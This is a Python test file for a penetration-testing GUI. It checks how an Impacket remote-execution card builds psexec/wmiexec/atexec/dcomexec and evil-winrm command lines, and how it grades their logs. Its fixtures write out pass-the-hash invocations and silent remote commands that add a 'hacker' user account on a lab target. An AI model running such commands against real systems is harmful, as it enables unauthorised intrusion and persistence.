"""Consolidation contract for the IMPACKET EXEC card.

The five legacy standalone cards (psexec / smbexec / wmiexec /
atexec / dcomexec) collapsed into ONE card in modules/lateral.py
with a METHOD dropdown that picks the impacket verb at run time.
These tests lock that contract:

  1. The registry exposes exactly ONE ``impacket_exec`` card, and
     none of the old separate ids.
  2. The METHOD dropdown offers every verb the operator expects.
  3. Each method resolves to the correct impacket-<verb> binary
     via the module-level ``impacket_bin_for`` helper — the same
     helper the live command preview and the RUN builder use.
  4. Fabricated command lines match the shape impacket-<verb>
     actually accepts (auth args + method-specific flags in the
     right order).

The command-building lives in a closure inside
``_open_impacket_auth_dialog``; tests exercise it via the module-
level bin helper + a re-implementation of the fixed command
shape (kept in sync with the dialog by convention).  Any drift
between the two is caught by ``test_dialog_bin_helper_matches_module``
which imports the dialog module and pokes the closure directly.
"""

import os
import sys
import types
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)


# ── headless customtkinter stub (before any gui.* import) ─────────
class _DummyCtk:
    def __init__(self, *a, **k):
        pass

    def __getattr__(self, _n):
        return _DummyCtk

    def __call__(self, *a, **k):
        return _DummyCtk()


def _install_customtkinter_stub():
    module = types.ModuleType("customtkinter")
    for name in (
        "CTkFrame", "CTkFont", "CTkButton", "CTkLabel", "CTkEntry",
        "CTkTextbox", "CTkToplevel", "CTkScrollableFrame",
        "CTkOptionMenu", "CTkCheckBox", "CTkRadioButton",
        "CTkProgressBar", "CTkTabview", "CTkSwitch",
        "StringVar", "BooleanVar", "IntVar",
    ):
        setattr(module, name, _DummyCtk)
    sys.modules["customtkinter"] = module


try:
    import customtkinter  # noqa: F401
except ModuleNotFoundError:
    _install_customtkinter_stub()
# ──────────────────────────────────────────────────────────────────

from modules.exploitation import ExploitationModule   # noqa: E402
from modules.lateral import LateralModule            # noqa: E402


class RegistryConsolidationTests(unittest.TestCase):
    """The consolidated card replaces three separate cards."""

    def _all_tool_ids(self):
        tools = list(ExploitationModule.TOOLS) + list(LateralModule.TOOLS)
        return {t.id for t in tools}

    def test_impacket_exec_is_registered(self):
        self.assertIn("impacket_exec", self._all_tool_ids())

    def test_old_standalone_cards_are_gone(self):
        for old_id in ("impacket_psexec", "impacket_wmiexec",
                       "impacket_atexec", "impacket_dcomexec",
                       "impacket_smbexec"):
            self.assertNotIn(
                old_id, self._all_tool_ids(),
                f"{old_id} still exposed as a standalone card")

    def test_card_is_in_lateral_module(self):
        lateral_ids = {t.id for t in LateralModule.TOOLS}
        self.assertIn("impacket_exec", lateral_ids)

    def test_card_targets_windows(self):
        tool = next(t for t in LateralModule.TOOLS
                    if t.id == "impacket_exec")
        self.assertEqual(tool.os_hint, "windows")

    def test_card_default_command_is_minimal(self):
        """cmd_template is informational — no cablate flags.  The
        actual command is built at run time from the METHOD dropdown
        + auth fields + method-specific extras."""
        tool = next(t for t in LateralModule.TOOLS
                    if t.id == "impacket_exec")
        # Only the placeholders + a method sentinel.  No hard-coded
        # -silentcommand / -nooutput / -object / etc.
        self.assertIn("<method>", tool.cmd_template)
        self.assertIn("{user}", tool.cmd_template)
        self.assertIn("{target}", tool.cmd_template)
        for cablate in ("-silentcommand", "-nooutput", "-object"):
            self.assertNotIn(
                cablate, tool.cmd_template,
                f"{cablate} is cablate in the default template — "
                "should be an extra, not hard-wired")


class MethodBinaryMappingTests(unittest.TestCase):
    """impacket_bin_for(method) — one source of truth for the
    method → binary map, shared with the dialog closure."""

    def setUp(self):
        # Import the helper directly so the test breaks if it's
        # renamed / removed / moved out of card_ad_routes.
        from gui.widgets.card_ad_routes import impacket_bin_for
        self._bin_for = impacket_bin_for

    def test_dropdown_methods(self):
        cases = {
            "psexec":   "impacket-psexec",
            "smbexec":  "impacket-smbexec",
            "wmiexec":  "impacket-wmiexec",
            "atexec":   "impacket-atexec",
            "dcomexec": "impacket-dcomexec",
        }
        for method, expected in cases.items():
            self.assertEqual(
                self._bin_for(method), expected,
                f"method {method!r} maps to the wrong binary")

    def test_non_exec_helpers_derive_the_same_way(self):
        cases = {
            "secretsdump": "impacket-secretsdump",
            "smbclient":   "impacket-smbclient",
            "mssqlclient": "impacket-mssqlclient",
            "lookupsid":   "impacket-lookupsid",
            "samrdump":    "impacket-samrdump",
            "rpcdump":     "impacket-rpcdump",
        }
        for method, expected in cases.items():
            self.assertEqual(self._bin_for(method), expected)

    def test_special_cases(self):
        # evil-winrm uses a dash (Ruby ecosystem convention) — the
        # rest of impacket uses hyphen-joined lowercase.
        self.assertEqual(self._bin_for("evil_winrm"), "evil-winrm")
        # goldenPac's capital P is a well-known impacket wart — the
        # binary IS named that way on Kali.
        self.assertEqual(self._bin_for("goldenpac"),
                         "impacket-goldenPac")


class MethodDropdownContentTests(unittest.TestCase):
    """The METHOD dropdown must offer the five exec verbs — nothing
    extra, nothing missing."""

    def test_expected_methods_are_offered(self):
        from gui.widgets.card_ad_routes import IMPACKET_EXEC_METHODS
        self.assertEqual(
            set(IMPACKET_EXEC_METHODS),
            {"psexec", "smbexec", "wmiexec", "atexec", "dcomexec"})

    def test_first_method_is_the_default(self):
        """The dropdown's first value is what the operator sees on
        first open.  Keep it stable — changing it silently changes
        every user's default run."""
        from gui.widgets.card_ad_routes import IMPACKET_EXEC_METHODS
        self.assertEqual(IMPACKET_EXEC_METHODS[0], "psexec")


class CommandShapeContractTests(unittest.TestCase):
    """Reproduce the dialog's command-building shape for each
    method and assert the flags land in the impacket-parseable
    order (options BEFORE user_part@target; extra command AFTER).

    This is a re-implementation kept in sync with
    ``_build_impacket_cmd`` in card_ad_routes.py by convention.
    A drift here is a signal to update the dialog's closure to
    match — or vice versa."""

    def _shape(self, method, *, user="Administrator", password="Pw123!",
               nthash="", domain="prova.prova.com",
               target="10.0.0.1",
               atexec_cmd="whoami",
               wmiexec_cmd="",
               silent=False, nooutput=False,
               dcom_object="MMC20"):
        from gui.widgets.card_ad_routes import impacket_bin_for
        bin_ = impacket_bin_for(method)
        user_part = f"{domain}/{user}" if domain else user
        if method == "evil_winrm":
            if nthash:
                nt_only = nthash.split(":")[-1] if ":" in nthash else nthash
                cmd = f"{bin_} -i {target} -u {user} -H {nt_only}"
            else:
                cmd = f"{bin_} -i {target} -u {user} -p {password}"
            return cmd
        if nthash:
            nt_fmt = nthash if ":" in nthash else f":{nthash}"
            cmd = (f"{bin_} {user_part}@{target} "
                   f"-hashes {nt_fmt} -no-pass")
        else:
            cmd = f"{bin_} {user_part}:{password}@{target}"
        # Method-specific flags — must land BEFORE the target.
        if method == "atexec" and silent:
            cmd = cmd.replace(f"{bin_} ", f"{bin_} -silentcommand ", 1)
        if method == "wmiexec" and nooutput:
            cmd = cmd.replace(f"{bin_} ", f"{bin_} -nooutput ", 1)
        if method == "dcomexec" and dcom_object != "MMC20":
            cmd = cmd.replace(f"{bin_} ",
                              f"{bin_} -object {dcom_object} ", 1)
        # atexec command always trails the target (mandatory).
        if method == "atexec":
            cmd = f"{cmd} {atexec_cmd}"
        # wmiexec optional trailing command (empty → interactive
        # shell; filled → one-shot; filled + -nooutput → fire-and-
        # forget).
        if method == "wmiexec" and wmiexec_cmd:
            cmd = f"{cmd} {wmiexec_cmd}"
        return cmd

    def test_psexec_password_shape(self):
        cmd = self._shape("psexec")
        self.assertEqual(
            cmd,
            "impacket-psexec prova.prova.com/Administrator:Pw123!@10.0.0.1")

    def test_smbexec_password_shape(self):
        cmd = self._shape("smbexec")
        self.assertEqual(
            cmd,
            "impacket-smbexec prova.prova.com/Administrator:Pw123!@10.0.0.1")

    def test_wmiexec_password_shape(self):
        cmd = self._shape("wmiexec")
        self.assertEqual(
            cmd,
            "impacket-wmiexec prova.prova.com/Administrator:Pw123!@10.0.0.1")

    def test_wmiexec_nooutput_flag_lands_before_target(self):
        # -nooutput alone (no wmiexec_cmd) — this shape is what the
        # operator sees in the preview; the RUN validator rejects it
        # separately because impacket forbids -nooutput without a
        # command.  The command-shape test here just locks the flag
        # order.
        cmd = self._shape("wmiexec", nooutput=True)
        self.assertEqual(
            cmd,
            "impacket-wmiexec -nooutput "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1")

    def test_wmiexec_one_shot_with_trailing_command(self):
        """Empty Command → interactive shell.  Filled Command →
        wmiexec runs it once and exits (output capture on).  Filled
        + -nooutput → fire-and-forget."""
        cmd = self._shape("wmiexec", wmiexec_cmd="hostname")
        self.assertEqual(
            cmd,
            "impacket-wmiexec "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1 hostname")

    def test_wmiexec_fire_and_forget(self):
        cmd = self._shape("wmiexec", nooutput=True,
                          wmiexec_cmd="net user hacker Pw! /add")
        self.assertEqual(
            cmd,
            "impacket-wmiexec -nooutput "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1 "
            "net user hacker Pw! /add")

    def test_atexec_appends_command(self):
        cmd = self._shape("atexec")
        self.assertEqual(
            cmd,
            "impacket-atexec "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1 whoami")

    def test_atexec_silent_flag_lands_before_target(self):
        cmd = self._shape("atexec", silent=True,
                          atexec_cmd="net user hacker Pw123! /add")
        self.assertEqual(
            cmd,
            "impacket-atexec -silentcommand "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1 "
            "net user hacker Pw123! /add")

    def test_dcomexec_default_object_is_omitted(self):
        """MMC20 is impacket's default — the dialog does NOT emit
        -object MMC20 to keep the command minimal."""
        cmd = self._shape("dcomexec")
        self.assertNotIn("-object", cmd)

    def test_dcomexec_explicit_object_lands_before_target(self):
        cmd = self._shape("dcomexec", dcom_object="ShellWindows")
        self.assertEqual(
            cmd,
            "impacket-dcomexec -object ShellWindows "
            "prova.prova.com/Administrator:Pw123!@10.0.0.1")

    def test_pass_the_hash_shape(self):
        cmd = self._shape("psexec", password="", nthash="0123abcd" * 4)
        self.assertIn("-hashes :" + "0123abcd" * 4, cmd)
        self.assertIn("-no-pass", cmd)
        self.assertNotIn("Pw123!", cmd)

    def test_evil_winrm_pth_shape(self):
        cmd = self._shape("evil_winrm", password="",
                          nthash="0123abcd" * 4)
        self.assertEqual(
            cmd,
            "evil-winrm -i 10.0.0.1 -u Administrator "
            "-H " + "0123abcd" * 4)


class _Terminal:
    def __init__(self):
        self.messages = []

    def write(self, msg, style=None):
        self.messages.append((msg, style))

    def section(self, title):
        self.messages.append((title, "section"))


def _run_parser(method, log_lines, **ctx):
    """Feed a fabricated impacket-<method> log through the parser
    and return the list of Target Intel finding kwargs it pushed.

    ctx overrides the stashed dialog context (auth / domain / cmd /
    silent / nooutput) — defaults are enough for the confirmed /
    launched cases; failure cases usually don't need overrides.
    """
    import types as _t
    from gui.widgets.card_parsers_ad import CardADParserMixin

    findings = []

    class Host(CardADParserMixin):
        def __init__(self):
            self.phase_id = "lateral"
            self._tool_widgets = {
                "impacket_exec": {
                    "_impacket_exec_method":  method,
                    "_impacket_exec_target":  ctx.get("target",
                                                       "10.0.0.1"),
                    "_impacket_exec_auth":    ctx.get(
                        "auth", "Administrator (password)"),
                    "_impacket_exec_domain":  ctx.get(
                        "domain", "prova.prova.com"),
                    "_impacket_exec_run_cmd": ctx.get("cmd",
                                                       "whoami"),
                    "_impacket_exec_silent":  ctx.get("silent",
                                                       False),
                    "_impacket_exec_nooutput": ctx.get("nooutput",
                                                        False),
                },
            }
            self.app = _t.SimpleNamespace(
                target_intel=_t.SimpleNamespace(
                    add_auto_finding=lambda **k: findings.append(k)),
                terminal=_Terminal())

        def _get_target(self):
            return ctx.get("target", "10.0.0.1")

    tool = _t.SimpleNamespace(
        name="IMPACKET EXEC", binary="impacket-psexec",
        id="impacket_exec")
    Host()._parse_impacket_exec_to_intel(
        tool, [("out", ln) for ln in log_lines])
    return findings


class ImpacketExecParserTests(unittest.TestCase):
    """The parser (_parse_impacket_exec_to_intel) is the ONLY place
    HAWK may claim RCE from an impacket-exec run — it must:

      • push HIGH severity ONLY when a real success signal shows up
        in the captured stdout (task lifecycle for atexec, WMI
        ReturnValue=0 for wmiexec -nooutput, SMB dialect line +
        payload for wmiexec one-shot)
      • push MEDIUM 'launched-unclear' when the spawn was observed
        but success could not be confirmed (e.g. the 2008 R2
        ADMIN$ output-read race for atexec)
      • push INFO 'attempt failed' with the actual failure signal
        (ACCESS_DENIED / CLASSNOTREG / etc.)
      • NEVER push HIGH just because the tool exited zero
    """

    def setUp(self):
        self._old_ctk = sys.modules.get("customtkinter")
        _install_customtkinter_stub()

    def tearDown(self):
        if self._old_ctk is None:
            sys.modules.pop("customtkinter", None)
        else:
            sys.modules["customtkinter"] = self._old_ctk

    # ── atexec ──────────────────────────────────────────────────

    def test_atexec_confirmed_pushes_high_with_evidence(self):
        log = [
            "Impacket v0.13.0 - Copyright Fortra",
            "[!] This will work ONLY on Windows >= Vista",
            "[*] Creating task \\aBcDeF12",
            "[*] Running task \\aBcDeF12",
            "[*] Deleting task \\aBcDeF12",
            "[*] Attempting to read ADMIN$\\Temp\\aBcDeF12.tmp",
            "nt authority\\system",
        ]
        findings = _run_parser("atexec", log)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["severity"], "high")
        self.assertIn("ATEXEC", f["title"])
        self.assertIn("nt authority\\system", f["description"])

    def test_atexec_2008r2_race_pushes_medium_launched(self):
        """Task fired but ADMIN$\\Temp read raced (2008 R2 bug).
        The parser must NOT claim RCE — task DID run, but HAWK
        can't be sure of the outcome without the output."""
        log = [
            "Impacket v0.13.0 - Copyright Fortra",
            "[*] Creating task \\aBcDeF12",
            "[*] Running task \\aBcDeF12",
            "[*] Deleting task \\aBcDeF12",
            "[*] Attempting to read ADMIN$\\Temp\\aBcDeF12.tmp",
            "[-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND",
        ]
        findings = _run_parser("atexec", log)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["severity"], "medium")
        self.assertIn("launched", f["title"].lower())
        self.assertIn("2008 R2", f["description"])

    def test_atexec_access_denied_pushes_info_failed(self):
        log = [
            "Impacket v0.13.0",
            "[-] SMB SessionError: STATUS_ACCESS_DENIED",
        ]
        findings = _run_parser("atexec", log)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["severity"], "info")
        self.assertIn("failed", f["title"].lower())
        self.assertIn("ACCESS_DENIED", f["description"])

    # ── wmiexec one-shot (with Command, no -nooutput) ───────────

    def test_wmiexec_one_shot_confirmed_pushes_high(self):
        log = [
            "Impacket v0.13.0",
            "[*] SMBv2.1 dialect used",
            "vagrant-2008R2",
        ]
        findings = _run_parser("wmiexec", log,
                                cmd="hostname", nooutput=False)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["severity"], "high")
        self.assertIn("WMIEXEC", f["title"])
        self.assertIn("vagrant-2008R2", f["description"])

    def test_wmiexec_nooutput_returnvalue_0_pushes_high(self):
        """Fire-and-forget: only signal is Win32_Process.Create
        ReturnValue=0 = spawn accepted by WMI."""
        log = [
            "Impacket v0.13.0",
            "class __PARAMETERS",
            "{",
            "        ProcessId = 1344",
            "        ReturnValue = 0",
            "}",
        ]
        findings = _run_parser(
            "wmiexec", log,
            cmd="cmd /c net user hacker Pw! /add",
            nooutput=True)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["severity"], "high")
        self.assertIn("WMIEXEC", f["title"])
        self.assertIn("ReturnValue=0", f["description"])

    # ── Failure signals shared across methods ───────────────────

    def test_classnotreg_maps_to_failed(self):
        """Even without a method-specific parser path, a
        REGDB_E_CLASSNOTREG signal must be treated as a failed
        attempt — this is the dcomexec-on-legacy pathological
        case."""
        log = [
            "Impacket v0.13.0",
            "[*] SMBv2.1 dialect used",
            ("[-] DCOM SessionError: code: 0x80040154 - "
             "REGDB_E_CLASSNOTREG - Class not registered."),
        ]
        # dcomexec is xterm-only in the current design, but the
        # parser should still handle the log if a future rewrite
        # routes it through ToolRunner — assert the classifier is
        # method-agnostic.
        findings = _run_parser("wmiexec", log,
                                cmd="whoami", nooutput=False)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "info")
        self.assertIn("CLASSNOTREG", findings[0]["description"])

    def test_no_stashed_method_returns_false_without_findings(self):
        """A run through _run_raw that somehow reached the parser
        without the dialog stashing the method (edge: session
        reload) must NOT crash and must NOT push a finding."""
        import types as _t
        from gui.widgets.card_parsers_ad import CardADParserMixin

        findings = []

        class Host(CardADParserMixin):
            def __init__(self):
                self.phase_id = "lateral"
                self._tool_widgets = {"impacket_exec": {}}   # no method
                self.app = _t.SimpleNamespace(
                    target_intel=_t.SimpleNamespace(
                        add_auto_finding=lambda **k:
                            findings.append(k)),
                    terminal=_Terminal())

            def _get_target(self):
                return "10.0.0.1"

        tool = _t.SimpleNamespace(
            name="IMPACKET EXEC", binary="impacket-psexec",
            id="impacket_exec")
        result = Host()._parse_impacket_exec_to_intel(
            tool, [("out", "[*] whatever")])
        self.assertFalse(result)
        self.assertEqual(findings, [])


if __name__ == "__main__":
    unittest.main()
